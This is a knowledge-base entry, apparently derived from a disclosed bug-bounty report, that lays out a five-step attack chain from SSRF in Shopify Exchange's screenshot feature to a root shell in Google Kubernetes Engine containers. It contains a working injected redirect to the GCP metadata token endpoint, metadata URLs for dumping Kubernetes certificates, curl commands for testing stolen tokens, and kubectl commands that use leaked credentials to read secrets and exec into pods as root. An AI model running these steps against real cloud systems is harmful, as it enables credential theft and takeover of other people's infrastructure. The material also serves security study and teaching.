---
tags:
  - ssrf
  - gcp
  - kubernetes
  - metadata-leak
  - rce
  - privilege-escalation
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/kubectl]]'
  - '[[tools/Image-Editing-Software]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-set-instance-metadata]]'
  - '[[commands/curl-query-token-info]]'
  - '[[commands/kubectl-get-pods]]'
  - '[[commands/kubectl-create-pod]]'
  - '[[commands/kubectl-delete-pod]]'
  - '[[commands/kubectl-exec-pod]]'
  - '[[commands/kubectl-describe-pod]]'
  - '[[commands/kubectl-get-secret]]'
  - '[[commands/kubectl-exec-pod-with-token]]'
  - '[[commands/kubectl-exec-pod-with-token-namespace]]'
  - '[[commands/id]]'
  - '[[commands/ls]]'
  - '[[commands/exit]]'
platforms:
  - Web
  - GCP
  - Kubernetes
complexity: high
procedures:
  - '[[procedures/Exploit-SSRF-to-Leak-GCP-Metadata-via-Screenshots]]'
  - '[[procedures/Test-and-Analyze-Leaked-GCP-Tokens]]'
  - '[[procedures/Leak-Kubernetes-Credentials-from-GCP-Metadata]]'
  - '[[procedures/Interact-with-Kubernetes-Cluster-Using-Leaked-Credentials]]'
  - >-
    [[procedures/Gain-Root-Shell-in-Kubernetes-Containers-Using-Service-Account-Token]]
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unsecured Credentials]]'
  - '[[Deploy Container]]'
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Command-Line Interface]]'
description: >-
  Multi-stage attack exploiting SSRF in Shopify Exchange to leak GCP metadata,
  Kubernetes credentials, and achieve root shell in containers.
skill_level: advanced
impact_level: high
id: 15b25a1c-6f97-451d-96f7-87a2f5daacee
created_at: '2025-12-11T06:10:23.905Z'
updated_at: '2025-12-11T06:10:23.905Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0007]]'
  - '[[TA0002]]'
  - '[[TA0004]]'
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1552]]'
  - '[[T1610]]'
  - '[[T1068]]'
  - '[[T1059]]'
---
# SSRF in Shopify Exchange Leading to Root Access in GCP Kubernetes Cluster

Multi-stage attack chain demonstrating exploitation of an SSRF vulnerability in Shopify Exchange's screenshot functionality to leak sensitive Google Cloud metadata, Kubernetes credentials, and ultimately gain root shell access in containers. This chain highlights chaining SSRF with metadata exposure and Kubernetes privilege escalation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~30 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial SSRF Exploitation] --> B[Token Analysis] --> C[Kubernetes Credential Leak] --> D[Cluster Interaction] --> E[Root Shell Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#2c3e50
    style E fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/kubectl]]
- [[tools/Image-Editing-Software]]
- [[tools/Chrome]]

### Target Environment

- Platform: GCP with Kubernetes
- Services: Shopify Exchange, Google Cloud Metadata, Google Kubernetes Engine
- Tech Stack: Docker containers

### Initial Access Requirements

- Access to partners.shopify.com to create a store
- Ability to install Shopify Exchange app
- No prior credentials needed; exploitation starts from public-facing service

## Detailed Attack Procedures

### Step 1: Exploit SSRF to Leak GCP Metadata - [[procedures/Exploit-SSRF-to-Leak-GCP-Metadata-via-Screenshots]]

**Objective**: Inject malicious script into Shopify store template to trigger SSRF in screenshot functionality, capturing GCP metadata in images.

**Instructions**:
Create a store on partners.shopify.com. Edit the password.liquid template to add: window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";. Install the Exchange app at https://exchange.shopify.com/create-a-listing to trigger screenshot. Download the PNG and view in [[tools/Image-Editing-Software]] or [[tools/Chrome]] to extract leaked token. Modify script for further leaks like SSH keys.

**Expected Output**: PNG images containing leaked metadata JSON.

**Success Indicators**:
- Screenshot shows internal metadata response
- Extracted token is valid for GCP APIs

### Step 2: Test Leaked Tokens - [[procedures/Test-and-Analyze-Leaked-GCP-Tokens]]

**Objective**: Verify permissions of leaked tokens and attempt metadata modifications.

**Instructions**:
Use [[commands/curl-set-instance-metadata]] to test token:

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```

Then check scopes with [[commands/curl-query-token-info]]:

```bash
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
```

**Expected Output**: Error for modification attempt; JSON with token scopes.

**Success Indicators**:
- Token scopes include cloud-platform access
- Confirmation of limited permissions for escalation planning

### Step 3: Leak Kubernetes Credentials - [[procedures/Leak-Kubernetes-Credentials-from-GCP-Metadata]]

**Objective**: Use SSRF to recursively dump kube-env attributes including certificates and keys.

**Instructions**:
Modify script to target http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json and capture in screenshot. Then specifically leak kube-env at http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json.

**Expected Output**: Screenshot with JSON containing Kubernetes certs, keys, and environment details.

**Success Indicators**:
- Extracted client.crt, client.pem, ca.crt files
- Valid Kubernetes server URL obtained

### Step 4: Interact with Kubernetes Cluster - [[procedures/Interact-with-Kubernetes-Cluster-Using-Leaked-Credentials]]

**Objective**: Use leaked certs to enumerate, create, and extract secrets from the cluster.

**Instructions**:
List pods with [[commands/kubectl-get-pods]]:

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces
```

Create pod with [[commands/kubectl-create-pod]]:

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml
```

Delete with [[commands/kubectl-delete-pod]]. Attempt exec with [[commands/kubectl-exec-pod]] (expect failure). Describe pod with [[commands/kubectl-describe-pod]] to leak secret name, then get secret with [[commands/kubectl-get-secret]].

**Expected Output**: Pod lists, creation/deletion confirmations, secret YAML with token.

**Success Indicators**:
- Successful pod management
- Leaked service account token

### Step 5: Gain Root Shell - [[procedures/Gain-Root-Shell-in-Kubernetes-Containers-Using-Service-Account-Token]]

**Objective**: Use leaked token to exec into pods and obtain root shell.

**Instructions**:
Exec into pod with [[commands/kubectl-exec-pod-with-token]]:

```bash
kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash
```

And another with [[commands/kubectl-exec-pod-with-token]]. Inside shell, run [[commands/id]] to confirm root, [[commands/ls]] to explore, and [[commands/exit]] to leave.

**Expected Output**: Root shell prompt; uid=0(root) from id; filesystem listing.

**Success Indicators**:
- Root access confirmed
- Ability to execute commands in container

## Attack Chain Summary

### Key Achievements

1. Leaked GCP metadata and Kubernetes credentials via SSRF
2. Interacted with Kubernetes API to extract service account token
3. Achieved root shell in multiple containers

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unsecured Credentials]]
- [[Deploy Container]]
- [[Exploitation for Privilege Escalation]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]
- [[Execution]]
- [[Privilege Escalation]]
- [[Credential Access]]

*Last updated: 2023-10-01*
